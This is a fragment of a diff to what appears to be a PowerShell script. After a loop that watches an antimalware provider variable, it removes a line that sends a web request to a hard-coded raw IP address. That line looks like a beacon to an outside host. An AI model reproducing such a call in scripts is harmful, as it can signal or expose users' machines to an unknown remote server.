@@ -34,4 +34,4 @@ while ($AntimalwareProvider -ne 0)
 }
 
 
-Invoke-WebRequest -Uri "http://34.131.237.85" -Method Get -UseBasicParsing
+
